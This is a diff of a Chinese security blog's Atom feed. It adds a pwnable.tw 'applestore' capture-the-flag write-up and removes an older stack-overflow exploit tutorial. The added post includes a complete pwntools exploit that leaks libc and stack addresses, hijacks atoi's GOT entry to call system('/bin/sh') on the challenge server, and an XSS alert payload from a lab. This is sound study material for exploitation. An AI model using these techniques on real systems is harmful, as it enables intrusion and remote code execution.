@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://bin2415.github.io/"/>
-  <updated>2018-01-22T11:26:01.555Z</updated>
+  <updated>2018-07-01T12:00:53.116Z</updated>
   <id>http://bin2415.github.io/</id>
   
   <author>
@@ -14,6 +14,64 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>pwnable.tw之applestore</title>
+    <link href="http://bin2415.github.io/2018/07/01/pwnable-tw/"/>
+    <id>http://bin2415.github.io/2018/07/01/pwnable-tw/</id>
+    <published>2018-07-01T08:50:23.000Z</published>
+    <updated>2018-07-01T12:00:53.116Z</updated>
+    
+    <content type="html"><![CDATA[<p>该题是模拟了apple的商店，来售卖apple的各种产品，其提供了6个功能:</p>
+<ul>
+<li>1: 展示商店的商品</li>
+<li>2: 添加商品到购物车</li>
+<li>3: 从购物车里面将某一商品删除</li>
+<li>4: 展示购物车里面的商品</li>
+<li>5: 结算</li>
+<li>6: 退出</li>
+</ul>
+<p>其中，购物车是用双向链表实现的，其每一项的结构如下，其在32位机器下的大小为16字节。链表头是一个全局变量，存在0x804b068处。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cart_entry</span>&#123;</span></div><div class="line">    <span class="keyword">char</span>* product_name,</div><div class="line">    <span class="keyword">int</span> price,</div><div class="line">    cart_entry* next,</div><div class="line">    cart_entry* previous</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>下面简单的分析添加，删除，购物车输出和结算功能。</p>
+<h3 id="添加商品"><a href="#添加商品" class="headerlink" title="添加商品"></a>添加商品</h3><p>添加商品是在add()函数中实现的，其在ida中反汇编出来的结果如下图所示：</p>
+<p><img src="/2018/07/01/pwnable-tw/./pwnable-tw/add_all.png" alt="add_all"></p>
+<p>该函数的逻辑也比较简单，其首先通过malloc在堆上分配16自己大小的空间，然后进行初始化，最后将该结构体添加到双向链表中。</p>
+<h3 id="结算"><a href="#结算" class="headerlink" title="结算"></a>结算</h3><p>结算功能是在checkout()函数中实现的，其在ida中反汇编出来的结果如下图所示:</p>
+<p><img src="/2018/07/01/pwnable-tw/./pwnable-tw/checkout.png" alt="checkout"></p>
+<p>由上图可知，其当满足总金额=7174时，则将一个临时变量v2(位于ebp-0x20)加入到双向链表中，而ebp-0x20处的内存如果能被我们所控制的话就可能进行攻击(泄露内存等)。而通过分析可知在cart()函数接收输入的时候我们的输入是能够覆盖到ebp-0x20处的。所以此时只需要满足购物车的总金额=7174即可。我们观察到一共有4种不同的价格(199,299,399,499),我们可以列个方程求出多种解。最直接的方法是交给<a href="https://github.com/Z3Prover/z3" target="_blank" rel="external">z3</a>求解器，具体求解如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> z3 <span class="keyword">import</span> *</div><div class="line">In [<span class="number">2</span>]: x = Int(<span class="string">'x'</span>)</div><div class="line">In [<span class="number">3</span>]: y = Int(<span class="string">'y'</span>)</div><div class="line">In [<span class="number">4</span>]: m = Int(<span class="string">'m'</span>)</div><div class="line">In [<span class="number">5</span>]: n = Int(<span class="string">'n'</span>)</div><div class="line">In [<span class="number">7</span>]: solve(x&gt;=<span class="number">0</span>,y&gt;=<span class="number">0</span>,m&gt;=<span class="number">0</span>,n&gt;=<span class="number">0</span>,<span class="number">199</span>*x+<span class="number">299</span>*y+<span class="number">399</span>*m+<span class="number">499</span>*n==<span class="number">7174</span>)</div><div class="line">[y = <span class="number">20</span>, x = <span class="number">6</span>, n = <span class="number">0</span>, m = <span class="number">0</span>]</div></pre></td></tr></table></figure>
+<p>即可求出结果，使得满足购物车总金额=7174.</p>
+<h3 id="输出购物车"><a href="#输出购物车" class="headerlink" title="输出购物车"></a>输出购物车</h3><p>输出购物车功能是在cart()函数中实现的，其在ida中反汇编出来的结果如下图所示：</p>
+<p><img src="/2018/07/01/pwnable-tw/./pwnable-tw/cart.png" alt="cart"></p>
+<p>在cart()函数中，有一个可以利用的地方就是在my_read()时，用户能输入0x15大小的数据，而输入的数据存进的内存即在ebp-0x22开始处，正好可以将checkout中的添加到双向链表的临时变量(ebp-0x20)给覆盖掉。如果我们将临时变量的第一个元素(存放商品名称)的地方存入atoi的got地址，则可以将libc的地址泄露出来。</p>
+<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>删除功能是在delete()函数中实现的，其在ida中反汇编出来的结果如下图所示:</p>
+<p><img src="/2018/07/01/pwnable-tw/./pwnable-tw/delete.png" alt="delete"></p>
+<p>删除操作就是在双向链表中找到要删除的项，然后就是正规的双向链表操作。由于我们可以通过输入控制ebp-0x20处的项的数据，如果我们将next和previous元素修改成特定的值，就有可能修改got表项，此时就造成了控制流的劫持。一开始我是将next修改成got[‘atoi’]-0xc，将previous改成system的地址，最后发生segment fault. 仔细一想，此时确实将atoi的got表项改成了system的地址了，但是也需要将system.addr+8赋值为got[‘atoi’]-0xc，而system.addr+8处是代码段，改程序又开了NX保护，所以会发生segment fault.</p>
+<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>通过前面的分析，我们可以利用cart()函数覆盖ebp-0x20处的内容，进而可以进行内存泄露攻击，将glibc的地址和栈中的地址泄露出来。通过delete函数，我们可以修改某一内存处的内容，如果我们修改ebp的值，使其在leave操作(mov esp, ebp; pop ebp)时，将修改后的ebp值赋给ebp寄存器，从而控制栈，进而修改got表项。</p>
+<h3 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h3><p>通过前面的分析我们可以看到在cart()函数中，如果将ebp-0x20处的内容覆盖为got[‘atoi’]的地址，则在cart函数输出的时候，就可以将atoi的got表项的内容泄露出来，即glibc的atoi函数的地址。</p>
+<p>泄露栈中的地址，一开始没有思路，通过网上的write up，学到了一个方法：glibc有一个全局变量’environ’,该变量保存用户环境，其是一个char**类型，在程序运行时，将用户环境指向栈上，所以environ存储的地址就是栈上的地址，如果我们将environ变量的内容泄露出来也就泄露出来了栈上的地址。</p>
+<h3 id="修改Got"><a href="#修改Got" class="headerlink" title="修改Got"></a>修改Got</h3><p>此前尝试直接将atoi的got表项改为system的地址会失败，通过查找write up发现有一个比较巧妙的方法: 通过修改子函数(delete函数)的saved ebp值为got[‘atoi’]+0x22的值，则返回delete函数到handle函数时，此时ebp即是got[‘atoi’]+0x22，此时通过my_read()函数将用户输入的值放入ebp-0x22处，即got[‘atoi’]，此时可以达到修改atoi的got表项的目的。而修改saved ebp值可以通过delete函数来实现。</p>
+<h3 id="完整攻击"><a href="#完整攻击" class="headerlink" title="完整攻击"></a>完整攻击</h3><p>完整攻击代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">control ebp to control the stack, so can modify atoi got</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addDevice</span><span class="params">(device_num)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'2'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Device Number&gt;'</span>)</div><div class="line">    p.sendline(device_num)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkout</span><span class="params">()</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'5'</span>)</div><div class="line">    p.recvuntil(<span class="string">'(y/n) &gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'y'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">cart</span><span class="params">(payload)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'4'</span>)</div><div class="line">    p.recvuntil(<span class="string">'(y/n) &gt;'</span>)</div><div class="line">    p.sendline(payload)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(payload)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'3'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Item Number&gt;'</span>)</div><div class="line">    p.sendline(payload)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="comment">#p = process('./applestore', env=&#123;'LD_PRELOAD' : './libc_32.so.6'&#125;)</span></div><div class="line">    p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10104</span>)</div><div class="line">    apple = ELF(<span class="string">'./applestore'</span>)</div><div class="line">    libc = ELF(<span class="string">'./libc_32.so.6'</span>)</div><div class="line">    <span class="comment">#print("pid : " + str(proc.pidof(p)))</span></div><div class="line">    <span class="comment">#raw_input('attach me ')</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</div><div class="line">        addDevice(<span class="string">'2'</span>)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">        addDevice(<span class="string">'1'</span>)</div><div class="line"></div><div class="line">    checkout()</div><div class="line"></div><div class="line">    <span class="comment"># leak libc address</span></div><div class="line">    payload = <span class="string">'y\x00'</span> + p32(apple.got[<span class="string">'atoi'</span>]) + <span class="string">'\x00\x00\x00\x00'</span> * <span class="number">3</span></div><div class="line">    <span class="comment">#addDevice(payload)</span></div><div class="line">    cart(payload)</div><div class="line">    p.recvuntil(<span class="string">'27: '</span>)</div><div class="line">    atoi_addr = u32(p.recvline()[<span class="number">0</span>:<span class="number">4</span>])</div><div class="line">    atoi_libc = libc.symbols[<span class="string">'atoi'</span>]</div><div class="line">    libc_base = atoi_addr - atoi_libc</div><div class="line">    log.info(<span class="string">'atoi address is '</span> + hex(atoi_addr))</div><div class="line">    log.info(<span class="string">'atoi address in libc is '</span> + hex(atoi_libc))</div><div class="line">    log.info(<span class="string">'libc base address is '</span> + hex(libc_base))</div><div class="line"></div><div class="line">    libc.address = libc_base</div><div class="line"></div><div class="line">    <span class="comment"># leak the stack address</span></div><div class="line">    environ_addr = libc.symbols[<span class="string">'environ'</span>]</div><div class="line">    payload = <span class="string">'y\x00'</span> + p32(environ_addr) + <span class="string">'\x00\x00\x00\x00'</span> * <span class="number">3</span></div><div class="line">    cart(payload)</div><div class="line">    p.recvuntil(<span class="string">'27: '</span>)</div><div class="line">    environ_addr = u32(p.recvline()[<span class="number">0</span>:<span class="number">4</span>])</div><div class="line">    log.info(<span class="string">'environ address is '</span> + hex(environ_addr))</div><div class="line">    ebp_address = environ_addr - <span class="number">0x104</span></div><div class="line"></div><div class="line">    <span class="comment"># delete, write the ebp to the atoi+0x22</span></div><div class="line">    payload = <span class="string">'27'</span> + p32(<span class="number">0x08049002</span>) + p32(<span class="number">0</span>) + p32(apple.got[<span class="string">'atoi'</span>] + <span class="number">0x22</span>) + p32(ebp_address - <span class="number">0x8</span>)</div><div class="line">    <span class="comment"># gdb.attach(p, '''</span></div><div class="line">    <span class="comment"># break *0x8048a3d</span></div><div class="line">    <span class="comment"># ''')</span></div><div class="line">    delete(payload)</div><div class="line">   </div><div class="line"></div><div class="line">    <span class="comment"># attack, set the atoi got to system addr, and execute the system('/bin/sh')</span></div><div class="line">    payload = p32(libc.symbols[<span class="string">'system'</span>]) + <span class="string">';/bin/sh\x00'</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">    p.sendline(payload)</div><div class="line"></div><div class="line"></div><div class="line">    p.interactive()</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;该题是模拟了apple的商店，来售卖apple的各种产品，其提供了6个功能:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;1: 展示商店的商品&lt;/li&gt;
+&lt;li&gt;2: 添加商品到购物车&lt;/li&gt;
+&lt;li&gt;3: 从购物车里面将某一商品删除&lt;/li&gt;
+&lt;li&gt;4: 展示购物车里面的商品&lt;/li&gt;
+    
+    </summary>
+    
+      <category term="pwnable" scheme="http://bin2415.github.io/categories/pwnable/"/>
+    
+    
+      <category term="pwnable" scheme="http://bin2415.github.io/tags/pwnable/"/>
+    
+  </entry>
   
   <entry>
     <title>gdb无法找到main</title>
@@ -498,7 +556,7 @@
 <li>启动apache2服务：sudo service apache2 start</li>
 <li>配置Apache服务，在/etc/apache2/sites-available/default中，配置如下：<br><img src="http://i.imgur.com/5pqUZOD.png" alt=""></li>
 </ul>
-<h2 id="实验内容："><a href="#实验内容：" class="headerlink" title="实验内容："></a>实验内容：</h2><h3 id="Task-1-显示Alert窗口"><a href="#Task-1-显示Alert窗口" class="headerlink" title="Task 1:显示Alert窗口"></a>Task 1:显示Alert窗口</h3><p>在用户名boby下的修改信息这一网页中，在个人说明中插入alert信息：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(‘XSS’);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure></p>
+<h2 id="实验内容："><a href="#实验内容：" class="headerlink" title="实验内容："></a>实验内容：</h2><h3 id="Task-1-显示Alert窗口"><a href="#Task-1-显示Alert窗口" class="headerlink" title="Task 1:显示Alert窗口"></a>Task 1:显示Alert窗口</h3><p>在用户名boby下的修改信息这一网页中，在个人说明中插入alert信息：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(‘XSS’);&lt;/script&gt;</div></pre></td></tr></table></figure></p>
 <a id="more"></a>
 <p>如下图所示:</p>
 <p><img src="http://i.imgur.com/N9cIcKG.png" alt=""></p>
@@ -561,7 +619,7 @@
 &lt;li&gt;启动apache2服务：sudo service apache2 start&lt;/li&gt;
 &lt;li&gt;配置Apache服务，在/etc/apache2/sites-available/default中，配置如下：&lt;br&gt;&lt;img src=&quot;http://i.imgur.com/5pqUZOD.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id=&quot;实验内容：&quot;&gt;&lt;a href=&quot;#实验内容：&quot; class=&quot;headerlink&quot; title=&quot;实验内容：&quot;&gt;&lt;/a&gt;实验内容：&lt;/h2&gt;&lt;h3 id=&quot;Task-1-显示Alert窗口&quot;&gt;&lt;a href=&quot;#Task-1-显示Alert窗口&quot; class=&quot;headerlink&quot; title=&quot;Task 1:显示Alert窗口&quot;&gt;&lt;/a&gt;Task 1:显示Alert窗口&lt;/h3&gt;&lt;p&gt;在用户名boby下的修改信息这一网页中，在个人说明中插入alert信息：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;alert(‘XSS’);&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&quot;实验内容：&quot;&gt;&lt;a href=&quot;#实验内容：&quot; class=&quot;headerlink&quot; title=&quot;实验内容：&quot;&gt;&lt;/a&gt;实验内容：&lt;/h2&gt;&lt;h3 id=&quot;Task-1-显示Alert窗口&quot;&gt;&lt;a href=&quot;#Task-1-显示Alert窗口&quot; class=&quot;headerlink&quot; title=&quot;Task 1:显示Alert窗口&quot;&gt;&lt;/a&gt;Task 1:显示Alert窗口&lt;/h3&gt;&lt;p&gt;在用户名boby下的修改信息这一网页中，在个人说明中插入alert信息：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;alert(‘XSS’);&amp;lt;/script&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
     
     </summary>
     
@@ -1246,83 +1304,6 @@
     
     
       <category term="ssh" scheme="http://bin2415.github.io/tags/ssh/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ExploitTutorial</title>
-    <link href="http://bin2415.github.io/2016/04/13/ExploitTutorial/"/>
-    <id>http://bin2415.github.io/2016/04/13/ExploitTutorial/</id>
-    <published>2016-04-13T07:27:07.000Z</published>
-    <updated>2017-06-20T10:23:52.974Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="声明：本博客是根据Exploit该链接所写"><a href="#声明：本博客是根据Exploit该链接所写" class="headerlink" title="声明：本博客是根据Exploit该链接所写"></a>声明：本博客是根据<a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="external">Exploit</a>该链接所写</h3><hr>
-<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ul>
-<li>实验环境：windows xp windows xp sp3</li>
-<li></li>
-<li>下载easyRmtomp3.exe,下载地址：<a href="https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe" target="_blank" rel="external">https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe</a></li>
-</ul>
-<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><h3 id="使程序crash"><a href="#使程序crash" class="headerlink" title="使程序crash"></a>使程序crash</h3><ul>
-<li>编写一个程序生成10000个字符，可以使程序crash，程序如图所示</li>
-</ul>
-<p><img src="http://i.imgur.com/mwATA96.png" alt="图1"></p>
-<ul>
-<li>crash的程序如下图所示：</li>
-</ul>
-<p><img src="http://i.imgur.com/20ltmX6.png" alt="图2"></p>
-<p>但没有出现崩溃，可见改程序采取了保护措施，将A的数量增加，增加到20000时，也不会崩溃，当增加到30000时，程序崩溃。如图所示：</p>
-<p><img src="http://i.imgur.com/IVtRxc0.png" alt="图3"></p>
-<p>会出现地址指针EIP指向0x41414141地址，由于找不到改地址所以该程序会发生崩溃。</p>
-<hr>
-<h3 id="栈信息介绍"><a href="#栈信息介绍" class="headerlink" title="栈信息介绍"></a>栈信息介绍</h3><p>栈的信息如下图所示：</p>
-<p><img src="http://i.imgur.com/mGAjPTR.png" alt="图4"></p>
-<hr>
-<h3 id="确定return的地址偏移"><a href="#确定return的地址偏移" class="headerlink" title="确定return的地址偏移"></a>确定return的地址偏移</h3><ul>
-<li>构造buffer字符串，生成25000个’A’和5000个’B’时，观察EIP的数值<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></div><div class="line">&#123; </div><div class="line">    </div><div class="line"> FILE* fp = <span class="literal">NULL</span>; </div><div class="line"> </div><div class="line">   fp = fopen(<span class="string">"crash2.m3u"</span>,<span class="string">"w+"</span>);</div><div class="line">    </div><div class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span>(fp == <span class="literal">NULL</span>)</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">    <span class="keyword">for</span>(i;i &lt; <span class="number">25000</span>; i++)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">fprintf</span>(fp,<span class="string">"\x41"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">5000</span>; i++)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">fprintf</span>(fp, <span class="string">"\x42"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>调试结果如图所示：</p>
-<p><img src="http://i.imgur.com/ZXmeTz4.png" alt=""></p>
-<p>可以知道EIP为0x42424242,所以return地址偏移在25000和30000之间</p>
-<ul>
-<li>测试eip的offset具体在什么位置</li>
-</ul>
-<p>利用metasploit的工具测试具体在什么位置，具体如下：cd metasplot-framework/tools</p>
-<p>./pattern_create.rb 5000 &gt; mima.txt 生成5000大小的字符串并输出到mima.txt文件</p>
-<p>构建前25000个为A，后5000个位mima.txt为内容的.m3u文件，如图所示：</p>
-<p><img src="http://i.imgur.com/lsg0d4l.png" alt=""></p>
-<p>得到的eip结果如下图所示：</p>
-<p><img src="http://i.imgur.com/WTx76bu.png" alt=""></p>
-<p>可知eip的值为0x42316A42</p>
-<p>然后利用metasploit工具找到具体是什么位置，命令如下：.pattern_offset.rb 0x423116A42 5000,得到结果为1053</p>
-<p>测试一下1053是否正确，编写如下程序：</p>
-<p><img src="http://i.imgur.com/27N33ZK.png" alt=""></p>
-<p>运行测试一下，结果如下图：</p>
-<p><img src="http://i.imgur.com/BIIpz22.png" alt=""></p>
-<p>可以看到eip指向的是0x42424242，所以找到的return的地址偏移是正确的</p>
-<hr>
-<h3 id="该教程先写到这，有空再继续-＾－＾-V"><a href="#该教程先写到这，有空再继续-＾－＾-V" class="headerlink" title="该教程先写到这，有空再继续(＾－＾)V"></a>该教程先写到这，有空再继续(＾－＾)V</h3>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;声明：本博客是根据Exploit该链接所写&quot;&gt;&lt;a href=&quot;#声明：本博客是根据Exploit该链接所写&quot; class=&quot;headerlink&quot; title=&quot;声明：本博客是根据Exploit该链接所写&quot;&gt;&lt;/a&gt;声明：本博客是根据&lt;a href=&quot;https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Exploit&lt;/a&gt;该链接所写&lt;/h3&gt;&lt;hr&gt;
-&lt;h1 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h1&gt;&lt;ul&gt;
-&lt;li&gt;实验环境：windows xp windows xp sp3&lt;/li&gt;
-&lt;li&gt;&lt;/li&gt;
-&lt;li&gt;下载easyRmtomp3.exe,下载地址：&lt;a href=&quot;https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
-    
-    </summary>
-    
-      <category term="反汇编" scheme="http://bin2415.github.io/categories/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
-    
-    
-      <category term="反汇编" scheme="http://bin2415.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
-    
-      <category term="翻译" scheme="http://bin2415.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
-    
-      <category term="Exploit" scheme="http://bin2415.github.io/tags/Exploit/"/>
     
   </entry>
   
